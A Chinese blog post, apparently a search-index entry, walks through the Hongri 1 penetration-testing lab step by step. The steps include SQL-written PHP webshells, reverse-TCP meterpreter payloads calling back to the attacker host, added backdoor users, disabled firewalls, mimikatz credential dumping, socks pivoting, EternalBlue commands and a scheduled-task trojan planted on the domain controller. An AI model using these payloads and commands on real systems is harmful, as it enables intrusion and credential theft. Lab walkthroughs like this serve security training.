<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红日（1）</title>
      <link href="posts/b2b89a7c/"/>
      <url>posts/b2b89a7c/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="环境搭建！"><a href="#环境搭建！" class="headerlink" title="环境搭建！"></a>环境搭建！</h1><p>这次是有三台靶机，一个web服务器，和一个域成员，域控！域成员和域控是没有联网的，只有web服务器是连接着网络的！<br>因此我们使用虚拟机进行构造出这样的环境！<br>虚拟机统一密码：*<strong>hongrisec@2019***<br>然后将winsever和win2k3改密码为 *</strong>hongrisec@2021***<br>此时再更改网络配置！</p><blockquote><p>win7：192.168.2.242 本地：192.168.52.143<br>win2008：192.168.52.138<br>win2k3：192.168.52.141<br>kail：192.168.2.122<br>可以互相ping通</p></blockquote><p>此时启动win7的<strong>phpstudy</strong><br><img src="https://img-blog.csdnimg.cn/20210420201337972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="模拟攻击"><a href="#模拟攻击" class="headerlink" title="模拟攻击"></a>模拟攻击</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里使用nbtscan要多使用几次才有可能扫到！<br><img src="https://img-blog.csdnimg.cn/20210420210306374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们访问win7的php网站服务！<br><img src="https://img-blog.csdnimg.cn/20210420210359519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时再使用==Nmap==扫描看看其开启了那些端口！<br><img src="https://img-blog.csdnimg.cn/20210420210523494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再用御剑扫描一下网站！<br><img src="https://img-blog.csdnimg.cn/20210420212327234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>此时我们发现这个后台登录页面！<br><img src="https://img-blog.csdnimg.cn/20210420210814939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们可以明显的找到sql语句执行的地方，我们尝试着写入一句话木马！<br><img src="https://img-blog.csdnimg.cn/20210420211412118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select 1,&#39;&lt;?php eval($_POST[harker]);?&gt;&#39; INTO OUTFILE &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;harker.php&#39;</span><br><span class="line">#使用OUTFILE会自动换行</span><br><span class="line">select 1,&#39;&lt;?php eval($_POST(harker);?&gt;&#39; INTO dumpfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;harker.php&#39;</span><br><span class="line">或者</span><br><span class="line">select &quot;&lt;?php eval($_POST[harker]);?&gt;&quot; into out file &#39;&#x2F;tmp&#x2F;harker.php&#39;</span><br></pre></td></tr></table></figure><p>此时尝试==开启全局日志==利用getshell</p><blockquote><p>show variables like ‘%general%’<br>一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;show global variables like &#39;%long_query_time%&#39;</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://img-blog.csdnimg.cn/20210420212436236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到功能是关闭的且回显日志文件的路径！<br>补充一些sql语句！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log&#x3D;1; #开启</span><br><span class="line">set global slow_query_log&#x3D;0; #关闭</span><br><span class="line">#伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名</span><br><span class="line">set global slow_query_log_file&#x3D;&#39;dir\filename&#39;</span><br></pre></td></tr></table></figure><p>此时我们按一下顺序进行执行！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;www&#x2F;harker.php&#39;</span><br><span class="line">#此时再写如一句话</span><br><span class="line">SELECT &quot;&lt;?php eval($_POST[harker]);?&gt;&quot;</span><br></pre></td></tr></table></figure><p>蚁剑进行链接！<img src="https://img-blog.csdnimg.cn/20210420213148731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过这里再补充一些其它途经！<br>还有一个地址<a href="http://192.168.2.242/yxcms/%E8%BF%99%E4%B8%AA%E6%98%AF%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%89%AB%E6%8F%8F%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%81">http://192.168.2.242/yxcms/这个是另一个扫描出来的地址！</a><br><img src="https://img-blog.csdnimg.cn/20210420213447136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>按照其提示就可以进行该网址的后台了<br><img src="https://img-blog.csdnimg.cn/20210420213834772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再上一张图！<br><img src="https://img-blog.csdnimg.cn/20210420214019446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们不知到路径，但是我们再扫描的时候有个源码泄露的地址beifen.rar这里来进行确定！<br>还有一个漏洞，就是XSS!还有SQL注入漏洞，可以用sqlmap直接跑！<br><img src="https://img-blog.csdnimg.cn/20210420214724985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>可以将小马传到上面去！<br>这里的思路是将shell1派给msf进行下一步渗透！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.43.169 LPORT&#x3D;1234 -f exe -o harker.exe</span><br></pre></td></tr></table></figure><p>然后再这样就可以了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter_reverse_tcp</span><br><span class="line">set lhost 172.20.10.8</span><br><span class="line">set lport 1234</span><br><span class="line">exploit -j(后台)允许</span><br></pre></td></tr></table></figure><p>再用蚁剑传上去，这样子我们的kali就可以控制它了！<br>我们此时可以使用蚁剑进行创造出另一个用户！<br><img src="https://img-blog.csdnimg.cn/20210420215648594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user harker hongrisec@2021 &#x2F;add</span><br><span class="line"></span><br><span class="line">(增加一个名为harker 密码为hongrisec@2021的用户名）</span><br></pre></td></tr></table></figure><p>关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210420215946281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="控制win7"><a href="#控制win7" class="headerlink" title="控制win7"></a>控制win7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 木马反弹shell</span><br><span class="line">2. SMB ms17_010</span><br></pre></td></tr></table></figure><p>先生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.2.122 LPORT&#x3D;1234 -f exe -o harker.exe</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210420220347320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再用蚁剑进行上传！然后运行它！<br><img src="https://img-blog.csdnimg.cn/20210420220652282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再kali中进行操作！<br><img src="https://img-blog.csdnimg.cn/20210420224341396.png" alt="在这里插入图片描述"><br>上面是个探测模块！<br><img src="https://img-blog.csdnimg.cn/2021042022543363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里便攻击成功了！</p><h3 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h3><p>Sysinfo<br>Getuid  (发现是administor权限)<br>Getsystem (获取system权限)<br><img src="https://img-blog.csdnimg.cn/20210420225714498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="主机密码收集"><a href="#主机密码收集" class="headerlink" title="主机密码收集"></a>主机密码收集</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows系统下的hash密码格式为：</span><br><span class="line">用户名称:RID:LM-HASH值:NT-HASH值</span><br><span class="line">NT-HASH hash生产方式：</span><br><span class="line"></span><br><span class="line"> <span class="number">1.</span> 将明文口令转换成十六进制的格式 </span><br><span class="line"> <span class="number">2.</span> 转换成Unicode格式，即在每个字节之后添加<span class="number">0x00</span></span><br><span class="line"> <span class="number">3.</span> 对Unicode字符串作MD4加密，生成<span class="number">32</span>位的十六进制数字串</span><br><span class="line"></span><br><span class="line">eg：用户密码为test123</span><br><span class="line">转换成十六进制的格式为<span class="number">74657374313233</span></span><br><span class="line">转换成Unicode格式为<span class="number">7400650073007400310032003300</span></span><br><span class="line">对字符串<span class="number">7400650073007400310032003300</span>作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1</span><br></pre></td></tr></table></figure><p>mimikatz模块已经合并为kiwi模块<br>加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，该进程也需要是system权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate PID</span><br><span class="line">load mimikatz</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210420230125233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后开始加载模块！<br><img src="https://img-blog.csdnimg.cn/20210420230418619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 比 mimikatz 更强大的 kiwi 模块！！<br> 这里我更新一下msf，这个模块加载不出来，所以更新的！其实这里是不是的，就是kiwi模块和mimikatz模块只能加载一个模块！<br> <strong>apt-get  install metasploit-framework</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件&#x2F;编码</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210421083928814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">#尝试开启3389端口！因为扫描时候是发现其没有开启的！</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210421084323127.png" alt="在这里插入图片描述"><br>此时进行远程连接！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u harker -p &quot;hongrisec@2021&quot; 192.168.43.142</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210421085328271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="内网搜集"><a href="#内网搜集" class="headerlink" title="内网搜集"></a>内网搜集</h2><p>ipconfig搜集一下！<br><img src="https://img-blog.csdnimg.cn/20210421085718757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>使用 ipconfig /all 查看 DNS 服务器：发现 DNS 服务器名为 god.org<br>查看域信息：net view<br>查看主域信息：net view /domain</p></blockquote><p>添加内网路由 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段!</p><blockquote><p>run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24</p></blockquote><p>扫描52该网段！<br><img src="https://img-blog.csdnimg.cn/20210421091109623.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br><span class="line">set rhosts 192.168.43.142</span><br></pre></td></tr></table></figure><p>扫描存活主机！<br><img src="https://img-blog.csdnimg.cn/20210421091455242.png" alt="在这里插入图片描述"><br>内网端口信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set rhosts 192.168.43.142</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210421091813421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>横向渗透前，先将该web服务器配置为代理服务器当作跳板机。<br>可用msf直接搭建sock隧道<br>下面是是添加路由！</p><blockquote><p>run autoroute -s 192.168.52.0/24</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure><p>进入session，自动创建路由<br><img src="https://img-blog.csdnimg.cn/20210421085940601.png" alt="在这里插入图片描述"><br>run get_local_subnets   //可以用此命令查看目标机器所在内网网端信息与公网网端信息。</p><blockquote><p>run autoroute -p查看路由信息！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;background</span><br><span class="line">&gt;use auxiliary&#x2F;server&#x2F;socks_proxy</span><br><span class="line">&gt;set version 4a</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure></blockquote><p>这里退回上层，设置代理路由！<br>使用socks4a进行代理，端口与proxychains里设置一致即可<br>run后 可用jobs查看任务是否执行</p><h3 id="挂代理"><a href="#挂代理" class="headerlink" title="挂代理"></a>挂代理</h3><p>先下个软件，proxychains这个东东，没有这个东西后面对win2k3的渗透很难进行下去！当时的时候代理这里卡了我好久，后来才知道我没有下载这个软件！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210421092124403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后可能会出现问题！<br><img src="https://img-blog.csdnimg.cn/20210421092323421.png" alt="在这里插入图片描述"><br>配置proxychains</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf或者vim &#x2F;etc&#x2F;proxychains4.config</span><br><span class="line">添加一句话：</span><br><span class="line">socks4127.0.0.1 1080</span><br></pre></td></tr></table></figure><p>此时我们再使用代理时便成功了！<br><img src="https://img-blog.csdnimg.cn/20210421093702335.png" alt="在这里插入图片描述"></p><p>设置代理成功后 使用其他工具时需要添加proxychains</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141  &#x2F;&#x2F; -Pn -sT 不可少</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210421153703879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="渗透win2003-远程登录"><a href="#渗透win2003-远程登录" class="headerlink" title="渗透win2003(远程登录)"></a>渗透win2003(远程登录)</h2><p>扫描一下主机版本</p><blockquote><p>use auxiliary/scanner/smb/smb_version</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210421154132654.png" alt="在这里插入图片描述"><br>namp开始扫描端口<br>如上上图，不过那上面大都超时了！多扫描几次！不过可能是代理没有挂好！</p><blockquote><p>使用永恒之蓝进行攻击！<br>use exploit/windows/smb/ms17_010_psexec<br>set payload windows/meterpreter/bind_tcp<br>set rhosts 192.168.52.141</p></blockquote><p>这里连接超时了，可能是还是代理的事情，或者网络的问题！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command net user cyshack @harker@ &#x2F;add  #添加用户</span><br><span class="line">run  #成功执行</span><br><span class="line">set command net localgroup administrators hack &#x2F;add  #管理员权限</span><br><span class="line">run  #成功执行</span><br><span class="line">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f&#39;  &#x2F;&#x2F;开启3389端口</span><br><span class="line">run #成功执行</span><br></pre></td></tr></table></figure><p>然后远程登录！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxychains rdesktop 192.168.52.141 </span><br></pre></td></tr></table></figure><h2 id="域控win2008-C盘共享传马"><a href="#域控win2008-C盘共享传马" class="headerlink" title="域控win2008(C盘共享传马)"></a>域控win2008(C盘共享传马)</h2><blockquote><p>use auxiliary/scanner/smb/smb_version<br>扫描版本信息</p></blockquote><hr /><p>这里就不上图了，因为我的kali里面的代理一直出错，代上了又超时了！不过不用代理也是可以的！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>可以得到域内用户密码！<br>这里利用 win7 向域控传一个msf马，并让域控中的马定时开启然后我们只需要在kali设置监听即可！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#生成木马</span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.52.143 LPORT&#x3D;9999 -f exe -o yukong.exe</span><br><span class="line">#上传木马，或者蚁剑上传！</span><br><span class="line">upload yukong.exe</span><br><span class="line">#win7连接域控的c盘共享</span><br><span class="line">net use \\192.168.52.138\c$ &quot;harker&#96;&quot; &#x2F;user:&quot;administrator&quot;</span><br><span class="line">(shell) copy C:\phpStudy\yukong.exe \192.168.52.138\c$</span><br><span class="line">#查看域控的c盘资源</span><br><span class="line">(shell) dir \\192.168.52.138\c$</span><br><span class="line">#设置一个任务计划，定时启动木马</span><br><span class="line">(shell) schtasks &#x2F;create &#x2F;tn &quot;test&quot; &#x2F;tr C:\yukong.exe &#x2F;sc once &#x2F;st 20:06 &#x2F;S 192.168.52.138 &#x2F;RU System &#x2F;u administrator &#x2F;p &quot;hongrisec@2021&quot;</span><br></pre></td></tr></table></figure><p>先生成木马<br><img src="https://img-blog.csdnimg.cn/2021042119200343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再上传到win7里面，然后开启共享！<br><img src="https://img-blog.csdnimg.cn/20210421195109564.png" alt="在这里插入图片描述"><br>此时再定定时任务！<br><img src="https://img-blog.csdnimg.cn/2021042119522325.png" alt="在这里插入图片描述"><br>此时再监听9999端口！<br><img src="https://img-blog.csdnimg.cn/20210421200047421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来张监听图！<br><img src="https://img-blog.csdnimg.cn/20210421200823908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里没有长时间没有连接成功！所以可能失败了，原因是因为这个木马运行了，但是一段时间后就自动停止运行了！<br>所以我们改一下！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxy nc -vv 192.168.52.138 9999#挂着代理连一下！</span><br><span class="line">马上线之后清除计划任务schtasks &#x2F;delete &#x2F;s 192.168.52.138 &#x2F;tn &quot;test&quot; &#x2F;f</span><br></pre></td></tr></table></figure><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 